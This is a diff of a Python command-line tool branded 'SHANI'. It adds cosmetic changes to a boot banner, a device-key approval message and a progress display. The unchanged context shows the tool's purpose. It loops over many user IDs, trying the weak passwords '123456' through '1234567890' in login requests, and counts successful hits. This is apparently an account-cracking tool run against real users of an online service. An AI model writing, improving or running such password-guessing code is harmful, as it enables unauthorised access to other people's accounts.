@@ -38,19 +38,19 @@ def boot():
     os.system("clear")
 
     print("\033[1;92m╔══════════════════════════════════════╗\033[0m")
-    time.sleep(0.3)
+    time.sleep(0.4)
 
     print("\033[1;92m║               S H A N I              ║\033[0m")
-    time.sleep(0.5)
-
-    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
-    time.sleep(0.3)
-
-    print("\033[1;96m║  Assalam O Alaikum                   ║\033[0m")
     time.sleep(0.6)
 
+    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
+    time.sleep(0.4)
+
+    print("\033[1;96m║  Assalam O Alaikum                   ║\033[0m")
+    time.sleep(0.7)
+
     print("\033[1;90m║  Initializing Security Protocols...  ║\033[0m")
-    time.sleep(0.5)
+    time.sleep(0.6)
 
     print("\033[1;92m║  Loading Modules...                  ║\033[0m")
     time.sleep(0.7)
@@ -180,7 +180,7 @@ key = get_device_key()
 status, exp = check_key(key)
 
 if status == "approved":
-    print("APPROVED DEVICE")
+    print("APPROVED DEVICE SUCCESSFULLY✅")
 
 else:
     access_denied_block(key, status, exp)
@@ -448,7 +448,7 @@ def ____old____(uid,total_ids):
     session = requests.session()
     
     try:
-        sys.stdout.write(f"[😈]\033[1;35m𝗦𝗛𝗔𝗡𝗜➪☠︎︎{green}{loop}/{red}{total_ids} | {green}OK:{len(oks)} \033[0m\r");sys.stdout.flush()
+        sys.stdout.write(f"[😈]\033[1;35m𝗦𝗛𝗔𝗡𝗜~𝗠𝗔𝗟𝗜𝗞  {green}{loop}/{red}{total_ids} | {green}OK:{len(oks)} | {purple}Be Patient\033[0m\r");sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789','1234567890'):
             data = {
                 'adid': str(uuid.uuid4()),
